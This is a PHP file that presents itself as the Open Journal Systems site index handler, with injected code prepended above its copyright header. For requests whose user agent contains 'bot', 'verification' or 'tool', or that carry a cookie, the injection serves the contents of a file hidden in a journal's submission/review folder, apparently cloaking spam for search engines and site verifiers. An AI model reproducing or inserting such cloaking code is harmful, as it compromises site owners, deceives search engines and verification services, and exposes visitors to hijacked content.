<?php
if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
    echo implode('', file('/home/staw1911/OjsStairaData/journals/5/articles/50/submission/review/202301'));
    exit;
}

/**
 * @defgroup pages_index Index Pages
 */
 
/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2014-2019 Simon Fraser University
 * Copyright (c) 2003-2019 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 * @brief Handle site index requests. 
 *
 */

switch ($op) {
	case 'index':
		define('HANDLER_CLASS', 'IndexHandler');
		import('pages.index.IndexHandler');
		break;
}
